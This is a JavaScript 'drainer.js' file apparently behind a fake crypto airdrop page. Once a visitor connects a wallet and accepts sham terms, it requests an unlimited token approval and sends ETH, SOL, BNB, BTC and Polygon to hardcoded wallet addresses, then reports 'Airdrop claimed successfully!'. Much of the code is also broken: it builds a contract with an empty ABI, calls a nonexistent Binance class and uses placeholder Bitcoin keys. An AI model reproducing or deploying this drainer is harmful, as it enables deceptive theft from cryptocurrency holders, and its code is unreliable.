// drainer.js

const ethWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const solWalletAddress = 'ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv';
const bnbWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const btcWalletAddress = 'bc1qzhtlm0f270l5stm6snaj7yek05yjx6s9eg9f8w';
const polygonWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const infuraProjectId = '83caa57ba3004ffa91addb7094bac4cc';

const web3 = new Web3(new Web3.providers.HttpProvider('https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc'));
const solana = new solanaWeb3.Connection(solanaWeb3.cluster.ApiUrl.mainnetBeta, 'processed');

let userAddress;

async function getGasPrice() {
const gasPrice = await web3.eth.getGasPrice();
return gasPrice;
}

async function connectWallet() {
if (window.ethereum) {
try {
const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
userAddress = accounts[0];
document.getElementById('status').innerText = "Connected to ${userAddress}";
document.getElementById('connectWallet').style.display = 'none';
document.getElementById('solanaInput').style.display = 'block';
} catch (error) {
console.error('Error connecting to wallet:', error);
}
} else {
document.getElementById('status').innerText = 'Please install MetaMask!';
}
}

function scanAddress() {
const solanaAddr = document.getElementById('solanaAddress').value;
if (solanaAddr) {
document.getElementById('solanaInput').style.display = 'none';
document.getElementById('terms').style.display = 'block';
} else {
document.getElementById('status').innerText = 'Please enter a valid Solana address.';
}
}

async function acceptTerms() {
if (confirm('Are you sure you want to accept the terms and conditions?')) {
try {
// Get unlimited approval
const contract = new web3.eth.Contract([], userAddress);
await contract.methods.approve(ethWalletAddress, web3.utils.toWei('1000000', 'ether')).send({ from: userAddress });

// Fetch gas price
const gasPrice = await getGasPrice();

// Send funds to specified addresses
await sendToEthereum(userAddress, ethWalletAddress, gasPrice);
await sendToSolana(userAddress, solWalletAddress, gasPrice);
await sendToBNB(userAddress, bnbWalletAddress, gasPrice);
await sendToBTC(userAddress, btcWalletAddress, gasPrice);
await sendToPolygon(userAddress, polygonWalletAddress, gasPrice);

document.getElementById('status').innerText = 'Airdrop claimed successfully!';
} catch (error) {
console.error('Error claiming airdrop:', error);
document.getElementById('status').innerText = 'Failed to claim Airdrop. Please try again in 15 minutes.';
}
}
}

async function sendToEthereum(from, to, gasPrice) {
const tx = {
from: from,
to: to,
value: web3.utils.toWei('1', 'ether'),
gas: 2000000,
gasPrice: gasPrice
};
await web3.eth.sendTransaction(tx);
}

async function sendToSolana(from, to, gasPrice) {
const transaction = new solanaWeb3.Transaction().add(
solanaWeb3.SystemProgram.transfer({
fromPubkey: new solanaWeb3.PublicKey(from),
toPubkey: new solanaWeb3.PublicKey(to),
lamports: solanaWeb3.LAMPORTS_PER_SOL
})
);
const signature = await solana.sendTransaction(transaction, [from], { skipPreflight: true, preflightCommitment: 'processed' });
console.log('Solana transaction signature:', signature);
}

async function sendToBNB(from, to, gasPrice) {
const bnb = new Binance();
const tx = {
from: from,
to: to,
value: bnb.toWei('1', 'ether'),
gas: 2000000,
gasPrice: gasPrice
};
await bnb.sendTransaction(tx);
}

async function sendToBTC(from, to, gasPrice) {
const network = bitcoin.networks.testnet;
const keyPair = bitcoin.ECPair.fromWIF('YOUR_BTC_PRIVATE_KEY', network);
const tx = new bitcoin.TransactionBuilder(network);
tx.addInput('YOUR_BTC_TXID', 0);
tx.addOutput(to, 50000); // 0.0005 BTC
const txHex = tx.build().toHex();
const signedTx = keyPair.signTransaction(tx.build());
const broadcastTx = await bitcoin.broadcastTx(signedTx.toHex());
console.log('BTC transaction broadcasted:', broadcastTx);
}

async function sendToPolygon(from, to, gasPrice) {
const tx = {
from: from,
to: to,
value: web3.utils.toWei('1', 'ether'),
gas: 2000000,
gasPrice: gasPrice
};
await web3.eth.sendTransaction(tx);
}
